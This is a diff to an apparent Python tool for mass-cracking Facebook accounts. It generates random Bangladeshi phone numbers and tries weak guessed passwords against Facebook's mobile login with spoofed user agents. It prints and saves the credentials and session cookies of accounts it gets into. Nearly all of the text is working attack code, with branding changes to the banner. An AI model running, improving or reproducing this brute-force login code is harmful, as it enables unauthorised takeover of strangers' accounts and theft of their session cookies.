@@ -1,4 +1,4 @@
-import os,sys,time,json,random,re,string,platform,base64,uuid
+ import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -29,7 +29,7 @@ try:
  open('.prox.txt','w').write(prox)
 except Exception as e:
  print('')
- proxy=open('.prox.txt','r').read().splitlines()
+proxy=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
     a='Nokia'
     b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -39,22 +39,33 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
+for rr in range (10000):
+  a='Mozilla/5.0 (Linux; Android'
+  b=random.choice (['4','5','6','7','8','9','10','11','12','13','14','15'])
+  c='SM-M136B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+  d=random. randrange(40,115)
+  e='0'
+  f=random. randrange(3000,6000)
+  g=random. randrange(20,100)
+  h='Mobile Safari/537.36'
+  ua=f'{a} {b}; {c}{d}, {e}, {f}, {g} {h}'
+  ugen. append(ua)
     
 logo=("""
 \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
-\x1b[1;90m┃  \033[1;91m88""Yb 8888b.  Yb  dP    \x1b[1;90m 
-\x1b[1;90m┃  \033[1;32m88__dP  8I  Yb  YbdP     \x1b[1;90m 
-\x1b[1;90m┃  \033[1;72m88"Yb   8I  dY  dPYb     \x1b[1;90m      
-\x1b[1;90m┃  \033[1;33m88  Yb  8888Y" dP  Yb  \x1b[1;90m 
-\x1b[1;90m┃  \033[1;93m  \x1b[1;90m
-\x1b[1;90m┃  \033[1;36m   \x1b[1;90m 
+\x1b[1;90m┃  \033[38;5;46m88""Yb 8888b.  Yb  dP    \x1b[1;90m 
+\x1b[1;90m┃  \033[38;5;46m88__dP  8I  Yb  YbdP     \x1b[1;90m 
+\x1b[1;90m┃  \033[38;5;46m88"Yb   8I  dY  dPYb     \x1b[1;90m      
+\x1b[1;90m┃  \033[38;5;46m88  Yb  8888Y" dP  Yb  \x1b[1;90m 
+\x1b[1;90m┃  \033[38;5;46m  \x1b[1;90m
+\x1b[1;90m┃  \033[38;5;46m   \x1b[1;90m 
 \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
 \033[1;96m═════════════════════════════════════════════
-\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: Rdx
-\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: FUCKER-404 \x1b[1;94m
-\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
-\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.2.0
-\033[1;96m═════════════════════════════════════════════
+\x1b[1;88m{+} \x1b[1;91mTOOL MAKED BY   \x1b[1;97m: RDX[MAHFUZ]
+\x1b[1;88m{+} \x1b[1;92mGITHUB ID      \x1b[1;97m: FUCKER-404 \x1b[1;94m
+\x1b[1;88m{+} \x1b[1;93mRANDOM TOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mFREE / \x1b[1;92mACTIVE
+\x1b[1;88m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m0.1.0
+\033[1;33m═════════════════════════════════════════════
 """)
 A = '\x1b[1;97m' 
 B = '\x1b[1;96m' 
@@ -72,12 +83,12 @@ def fuck():
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/1060774804926904')
     print(logo)
-    print('[+] SIM CODE BD=> 016•017•018•019')
+    print('[+] SIM CODE BD=> 013•016•017•018•019')
     nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
     nudex = ''.join(random.choice(string.digits) for _ in range(2))
     nud = ''.join(random.choice(string.digits) for _ in range(2))
-    print('[+] 2000•5000•10000•15000•50000')
-    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
+    print('[+] 3000•7000•30000•55000•100000')
+    limit = int(input('[?] ENTER YOUR CLONE ID LIMIT : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -94,9 +105,9 @@ def fuck():
             uid = nude+nudex+nud+guru
             pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
             turag.submit(rcrack,uid,pwx,tl)
-    print('\033[1;32m─────────────────────────────────────────────────────────')
-    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
-    print('\033[1;32m─────────────────────────────────────────────────────────')
+    print('\033[1;62m─────────────────────────────────────────────────────────')
+    print('\033[1;17m[\033[1;92m~\033[1;27m] IDz CLONE COMPLETED..')
+    print('\033[1;82m─────────────────────────────────────────────────────────')
 def rcrack(uid,pwx,tl):
     global loop
     global cps
@@ -107,9 +118,9 @@ def rcrack(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sRDX\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sRDX\033[1;31m]\033[1;94m\033[1;61m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -120,36 +131,35 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'd.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'lmethod': 'GET',
     'scheme': 'https', 
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'dpr': '0.9',
+    'dpr': '1.7937500476837158',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
-    'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.89", "Google Chrome";v="118.0.5993.89", "Not=A?Brand";v="99.0.0.0"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Primo H9 Pro"',
+    'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro,
-    'viewport-width': '901',
+    'user-agent':pro,
+    'viewport-width': '980',
 }
-            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f"\033[38;5;46m[RDX-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
-                open('/sdcard/TURAG-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/RDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
